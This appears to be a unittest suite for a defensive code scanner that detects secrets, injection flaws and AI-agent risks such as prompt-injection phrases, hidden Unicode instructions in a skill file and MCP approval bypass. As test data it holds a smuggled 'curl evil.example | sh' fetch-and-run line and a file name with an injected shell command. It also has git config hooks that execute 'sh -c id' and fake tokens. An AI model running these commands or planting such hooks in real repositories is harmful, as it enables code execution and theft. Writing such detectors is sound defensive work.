"""Tests for scripts/gate_scan.py (stdlib unittest, no third-party deps).

Run: python3 -I -m unittest discover -s tests -v   (from the mod root)
"""
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stdout

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "scripts"))
import gate_scan  # noqa: E402

FIX = os.path.join(HERE, "fixtures")


def rules_in(path):
    return {f.rule for f in gate_scan.scan_paths([path])}


class PlantedDefects(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.vuln = rules_in(os.path.join(FIX, "vulnerable_app.py"))

    def test_1_hardcoded_credential(self):
        self.assertIn("secret.hardcoded-credential", self.vuln)

    def test_2_shell_injection(self):
        self.assertIn("code.shell-injection", self.vuln)

    def test_3_unsafe_deserialization(self):
        self.assertIn("code.unsafe-deserialization", self.vuln)

    def test_4_sql_injection(self):
        self.assertIn("code.sql-string-build", self.vuln)

    def test_5_tls_verify_disabled(self):
        self.assertIn("code.tls-verify-disabled", self.vuln)

    def test_6_weak_hash(self):
        self.assertIn("code.weak-hash", self.vuln)

    def test_7_yaml_load_counts_as_deserialization(self):
        lines = [f.line for f in gate_scan.scan_paths([os.path.join(FIX, "vulnerable_app.py")])
                 if f.rule == "code.unsafe-deserialization"]
        self.assertEqual(len(lines), 2, "pickle.loads and yaml.load should both be flagged")

    def test_8_private_key(self):
        self.assertIn("secret.private-key", rules_in(os.path.join(FIX, "leaked_key.txt")))


class NoFalsePositives(unittest.TestCase):
    def test_safe_fixture_is_clean(self):
        found = gate_scan.scan_paths([os.path.join(FIX, "safe_app.py")])
        self.assertEqual(found, [], [f"{f.rule}:{f.line}" for f in found])

    def test_identifier_containing_eval(self):
        self.assertEqual(gate_scan.scan_text("evaluate_score = 3\nx.eval_mode = 1", "t"), [])

    def test_yaml_safe_loader(self):
        self.assertEqual(gate_scan.scan_text("yaml.load(s, Loader=yaml.SafeLoader)", "t"), [])

    def test_parameterized_sql(self):
        self.assertEqual(gate_scan.scan_text('cur.execute("SELECT 1 WHERE a = %s", (a,))', "t"), [])

    def test_markers_ignored_by_default(self):
        gate_scan.HONOR_MARKERS = False
        self.assertTrue(gate_scan.scan_text("os.system(cmd)  # ssdlc: allow trust me", "t"))

    def test_honored_marker_needs_reason_and_is_reported(self):
        gate_scan.HONOR_MARKERS = True
        try:
            gate_scan.SUPPRESSED.clear()
            self.assertEqual(gate_scan.scan_text("os.system(cmd)  # ssdlc: allow reviewed by sec team", "t"), [])
            self.assertEqual(gate_scan.SUPPRESSED[-1]["reason"], "reviewed by sec team")
            self.assertTrue(gate_scan.scan_text("os.system(cmd)  # ssdlc: allow", "t"), "bare marker must not suppress")
        finally:
            gate_scan.HONOR_MARKERS = False

    def test_marker_never_hides_secrets_or_hidden_chars(self):
        gate_scan.HONOR_MARKERS = True
        try:
            key = "AKIA" + "ABCDEFGHIJKLMNOP"
            rules = {f.rule for f in gate_scan.scan_text(f'k = "{key}"  # ssdlc: allow test data', "t")}
            self.assertIn("secret.aws-access-key", rules)
            hidden = "x" + chr(0xE0041) + "  # ssdlc: allow fine"
            self.assertIn("ai.unicode-tag-smuggling", {f.rule for f in gate_scan.scan_text(hidden, "t")})
        finally:
            gate_scan.HONOR_MARKERS = False


class SecretPatterns(unittest.TestCase):
    def check(self, rule, sample):
        rules = {f.rule for f in gate_scan.scan_text(sample, "t")}
        self.assertIn(rule, rules, sample[:12])

    def test_aws(self):
        self.check("secret.aws-access-key", "key = " + "AKIA" + "ABCDEFGHIJKLMNOP")

    def test_github(self):
        self.check("secret.github-token", "ghp_" + "a" * 36)

    def test_anthropic(self):
        self.check("secret.anthropic-key", "sk-ant-" + "api03-" + "x" * 30)

    def test_slack(self):
        self.check("secret.slack-token", "xoxb-" + "1234567890-abc")

    def test_redaction_hides_value(self):
        token = "ghp_" + "Q" * 36
        f = gate_scan.scan_text("t = '" + token + "'", "t")[0]
        self.assertNotIn(token, f.excerpt)

    def test_code_evidence_not_mangled(self):
        f = gate_scan.scan_text("requests.get(url, verify=False)", "t")[0]
        self.assertEqual(f.excerpt, "requests.get(url, verify=False)")


class Cli(unittest.TestCase):
    def run_cli(self, *args):
        return subprocess.run([sys.executable, "-I", os.path.join(ROOT, "scripts", "gate_scan.py"), *args],
                              capture_output=True, text=True)

    def test_exit_1_and_json_on_findings(self):
        r = self.run_cli("--json", os.path.join(FIX, "vulnerable_app.py"))
        self.assertEqual(r.returncode, 1)
        self.assertGreaterEqual(len(json.loads(r.stdout)["findings"]), 7)

    def test_exit_0_on_clean(self):
        self.assertEqual(self.run_cli(os.path.join(FIX, "safe_app.py")).returncode, 0)

    def test_exit_2_without_paths(self):
        self.assertEqual(self.run_cli().returncode, 2)

    def test_skips_binary_and_git_dirs(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, ".git"))
            with open(os.path.join(d, ".git", "config"), "w") as fh:
                fh.write("os.system(x)\n")
            with open(os.path.join(d, "blob.bin"), "wb") as fh:
                fh.write(b"\0\0os.system(x)")
            self.assertEqual(gate_scan.scan_paths([d]), [])


class AiAgentRules(unittest.TestCase):
    """OWASP LLM Top 10 2026 / Agentic Top 10 2026 rules against planted fixtures."""

    def rules(self, name):
        return [f.rule for f in gate_scan.scan_paths([os.path.join(FIX, name)])]

    def test_vulnerable_ai_app_hits_every_planted_rule(self):
        got = set(self.rules("vulnerable_ai_app.py"))
        for rule in ["ai.langchain-loads", "ai.trust-remote-code", "ai.unpinned-model-ref",
                     "ai.dangerous-deserialization-flag", "ai.unsafe-model-load", "ai.open-ended-agent-tool",
                     "ai.unbounded-agent", "ai.agent-approval-bypass", "ai.agent-unsandboxed-exec"]:
            self.assertIn(rule, got)
        self.assertEqual(self.rules("vulnerable_ai_app.py").count("ai.unsafe-model-load"), 2)

    def test_html_sink(self):
        self.assertIn("ai.llm-output-html-sink", self.rules("ChatView.jsx"))

    def test_safe_ai_app_is_clean_including_multiline_call(self):
        found = gate_scan.scan_paths([os.path.join(FIX, "safe_ai_app.py")])
        self.assertEqual(found, [], [f"{f.rule}:{f.line}" for f in found])

    def test_poisoned_instruction_file_reveals_hidden_text(self):
        found = gate_scan.scan_paths([os.path.join(FIX, "poisoned_SKILL.md")])
        rules = [f.rule for f in found]
        for rule in ["ai.unicode-tag-smuggling", "ai.invisible-or-bidi-chars", "ai.prompt-injection-phrase"]:
            self.assertIn(rule, rules)
        tag = next(f for f in found if f.rule == "ai.unicode-tag-smuggling")
        self.assertIn("curl evil.example | sh", tag.excerpt)
        self.assertFalse(gate_scan.INVISIBLE.search(tag.excerpt), "raw invisible chars must not be echoed")

    def test_mcp_config_bad(self):
        found = gate_scan.scan_paths([os.path.join(FIX, "mcp_bad.json")])
        rules = [f.rule for f in found]
        self.assertEqual(rules.count("ai.mcp-unpinned"), 3)  # npx unpinned, uvx unpinned, @latest
        self.assertIn("ai.mcp-inline-secret", rules)
        self.assertIn("ai.mcp-plaintext-transport", rules)
        self.assertIn("ai.agent-approval-bypass", rules)  # autoApprove list
        secret = next(f for f in found if f.rule == "ai.mcp-inline-secret")
        self.assertNotIn("9f8e7d6c5b4a3210", secret.excerpt)

    def test_mcp_config_safe(self):
        found = gate_scan.scan_paths([os.path.join(FIX, "mcp_safe.json")])
        self.assertEqual(found, [], [f"{f.rule}:{f.excerpt}" for f in found])

    def test_claude_settings_wildcards_and_bypass(self):
        rules = self.rules("claude_settings_bad.json")
        self.assertEqual(rules.count("ai.agent-wildcard-allowlist"), 2)  # Bash/mcp__* line, enableAllProjectMcpServers
        self.assertIn("ai.agent-approval-bypass", rules)

    def test_git_config_exec_settings_only(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, ".git"))
            with open(os.path.join(d, ".git", "config"), "w") as fh:
                fh.write("[core]\n\tfsmonitor = ./.payload.sh\n\tpassword = \"not-scanned-here\"\n")
            self.assertEqual([f.rule for f in gate_scan.scan_paths([d])], ["repo.git-config-exec"])

    def test_skipped_files_are_reported(self):
        gate_scan.SKIPPED.clear()
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "blob.bin"), "wb") as fh:
                fh.write(b"\0\0")
            os.makedirs(os.path.join(d, "dist"))
            gate_scan.scan_paths([d])
        reasons = sorted(x["reason"] for x in gate_scan.SKIPPED)
        self.assertEqual(reasons, ["binary (NUL byte)", "directory skipped by default"])


class ReviewFixes(unittest.TestCase):
    """Regression tests for the v0.2.0 independent review (SR-n goldfish, T-n elephant)."""

    def cli(self, *args, **kw):
        return subprocess.run([sys.executable, "-I", os.path.join(ROOT, "scripts", "gate_scan.py"), *args],
                              capture_output=True, text=True, timeout=30, **kw)

    def test_sr7_secret_redacted_in_non_secret_finding(self):
        key = "sk-ant-" + "api03-" + "Z" * 30
        line = f'requests.get(u, headers={{"Authorization": "Bearer {key}"}}, verify=False)'
        for f in gate_scan.scan_text(line, "t"):
            self.assertNotIn(key, f.excerpt, f.rule)
            self.assertNotIn("Z" * 10, f.excerpt, f.rule)

    def test_sr7_punctuated_password_redacted(self):
        f = gate_scan.scan_text('password = "P@ssw0rd!2024"', "t")[0]
        self.assertNotIn("P@ssw0rd!2024", f.excerpt)
        self.assertIn("P@ss…", f.excerpt)

    def test_t3_control_chars_escaped(self):
        f = gate_scan.scan_text("os.system(x)  # \x1b]52;c;ZXZpbA==\x07", "t")[0]
        self.assertNotIn("\x1b", f.excerpt)
        self.assertIn("\\x1b", f.excerpt)

    def test_sr6_redos_bounded(self):
        import time
        hostile = ['cur.execute("' + "select " * 40000, "token=" * 400000, "subprocess.run(" + "a," * 300000]
        start = time.monotonic()
        for line in hostile:
            gate_scan.scan_text(line, "t")
        self.assertLess(time.monotonic() - start, 5.0)
        self.assertTrue(any("partially scanned" in x["reason"] for x in gate_scan.SKIPPED))

    def test_sr10_missing_path_is_incomplete(self):
        r = self.cli("/nonexistent/ssdlc-path")
        self.assertEqual(r.returncode, 3, r.stdout)
        self.assertIn("INCOMPLETE", r.stdout)

    @unittest.skipUnless(hasattr(os, "mkfifo"), "needs mkfifo")
    def test_sr10_fifo_never_opened(self):
        with tempfile.TemporaryDirectory() as d:
            os.mkfifo(os.path.join(d, "pipe"))
            r = self.cli("--json", d)
            out = json.loads(r.stdout)
            self.assertEqual(r.returncode, 3)
            self.assertEqual(out["skipped"][0]["reason"], "not a regular file")

    def test_t14_unknown_flag_and_double_dash(self):
        self.assertEqual(self.cli("--stict", os.path.join(FIX, "safe_app.py")).returncode, 2)
        with tempfile.TemporaryDirectory() as d:
            weird = os.path.join(d, "--json")
            with open(weird, "w") as fh:
                fh.write("os.system(x)\n")
            r = self.cli("--", weird)
            self.assertEqual(r.returncode, 1)

    def test_t2_files_from_nul_separated(self):
        with tempfile.TemporaryDirectory() as d:
            evil = os.path.join(d, "x$(touch pwned).py")
            with open(evil, "w") as fh:
                fh.write("os.system(x)\n")
            lst = os.path.join(d, "list")
            with open(lst, "wb") as fh:
                fh.write(evil.encode() + b"\0")
            r = self.cli("--json", "--files-from", lst)
            self.assertEqual(json.loads(r.stdout)["findings"][0]["rule"], "code.shell-injection")
            self.assertFalse(os.path.exists(os.path.join(d, "pwned")))

    def test_sr9_git_config_keys_case_insensitive(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, ".git"))
            with open(os.path.join(d, ".git", "config"), "w") as fh:
                fh.write('[core]\n\tfsMonitor = ./x.sh\n\tsshCommand = ./y\n[filter "x"]\n\tclean = sh -c id\n'
                         '[diff]\n\texternal = ./z\n[alias]\n\tst = !sh -c id\n[user]\n\tname = A\n')
            found = gate_scan.scan_paths([d])
            self.assertEqual(len(found), 5, [f.excerpt for f in found])
            self.assertEqual({f.rule for f in found}, {"repo.git-config-exec"})

    def test_sr19_mcp_jsonc_windows_and_major_only(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "mcp.json")
            with open(p, "w") as fh:
                fh.write('{\n  // VS Code style\n  "servers": {\n'
                         '    "a": { "command": "npx.cmd", "args": ["-y", "pkg-a"] },\n'
                         '    "b": { "command": "cmd", "args": ["/c", "npx", "-y", "pkg-b@1"] },\n'
                         '    "c": { "command": "npx", "args": ["-y", "pkg-c@1.2.3"], "headers": {"X-API-Key": "abcdefgh1234"} },\n'
                         '  },\n}\n')
            found = gate_scan.scan_paths([d])
            self.assertEqual(sorted(f.rule for f in found), ["ai.mcp-inline-secret", "ai.mcp-unpinned", "ai.mcp-unpinned"])

    def test_sr15_git_symlink_reported(self):
        with tempfile.TemporaryDirectory() as d:
            outside, repo = os.path.join(d, "o"), os.path.join(d, "r")
            os.makedirs(os.path.join(outside, "g")); os.makedirs(repo)
            with open(os.path.join(outside, "g", "config"), "w") as fh:
                fh.write("[core]\n\tfsmonitor = x\n")
            os.symlink(os.path.join(outside, "g"), os.path.join(repo, ".git"))
            self.assertIn("repo.symlink-escape", [f.rule for f in gate_scan.scan_paths([repo])])

    def test_sr21_state_reset_between_scans(self):
        gate_scan.scan_paths(["/nonexistent/a"])
        gate_scan.scan_paths([os.path.join(FIX, "safe_app.py")])
        self.assertEqual(gate_scan.SKIPPED, [])


class ChecklistConsistency(unittest.TestCase):
    """references/ai-risk-checklist.md and the scanner must name the same rules."""
    EXTRA = {"ai.mcp-unpinned", "ai.mcp-inline-secret", "ai.mcp-plaintext-transport", "repo.symlink-escape"}

    def setUp(self):
        import re as _re
        with open(os.path.join(ROOT, "references", "ai-risk-checklist.md"), encoding="utf-8") as fh:
            text = fh.read()
        self.named = set(_re.findall(r"`((?:ai|code|repo)\.[a-z0-9-]+)`", text))
        self.prefix = {m for m in _re.findall(r"`(secret)\.\*`", text)}
        self.defined = {r[0] for r in gate_scan.RULES} | self.EXTRA

    def test_checklist_names_only_real_rules(self):
        self.assertEqual(self.named - self.defined, set())

    def test_every_ai_rule_is_in_the_checklist(self):
        ai = {r for r in self.defined if r.startswith(("ai.", "repo."))}
        self.assertEqual(ai - self.named, set())

    def test_every_ai_rule_cites_owasp_2026(self):
        for rule, _sev, refs, _rx in gate_scan.RULES:
            if rule.startswith("ai."):
                self.assertTrue(any(r.endswith(":2026") or r.startswith("ASI") for r in refs), rule)


class RefsAndLinks(unittest.TestCase):
    REF = __import__("re").compile(r"^(CWE-\d+|LLM(0[1-9]|10):2026|ASI(0[1-9]|10))$")

    def test_every_rule_has_valid_refs(self):
        for rule, _sev, refs, _rx in gate_scan.RULES:
            self.assertTrue(refs, rule)
            for r in refs:
                self.assertRegex(r, self.REF, rule)

    def test_refs_in_json_output(self):
        f = gate_scan.scan_text("pickle.loads(b)", "t")[0]
        self.assertIn("CWE-502", f.refs)

    def test_symlink_escape_reported_not_followed(self):
        with tempfile.TemporaryDirectory() as d:
            outside, repo = os.path.join(d, "home"), os.path.join(d, "repo")
            os.makedirs(outside); os.makedirs(repo)
            secret = os.path.join(outside, "id_ed25519")
            with open(secret, "w") as fh:
                fh.write("-----BEGIN " + "OPENSSH PRIVATE KEY-----\n")
            os.symlink(secret, os.path.join(repo, "notes.txt"))
            os.symlink(outside, os.path.join(repo, "linkdir"))
            found = gate_scan.scan_paths([repo])
            self.assertEqual(sorted(f.rule for f in found), ["repo.symlink-escape"] * 2)
            self.assertFalse(any("PRIVATE" in f.excerpt for f in found))

    def test_symlink_inside_repo_is_fine(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "a.txt"), "w") as fh:
                fh.write("hello\n")
            os.symlink("a.txt", os.path.join(d, "b.txt"))
            self.assertEqual(gate_scan.scan_paths([d]), [])


if __name__ == "__main__":
    unittest.main()
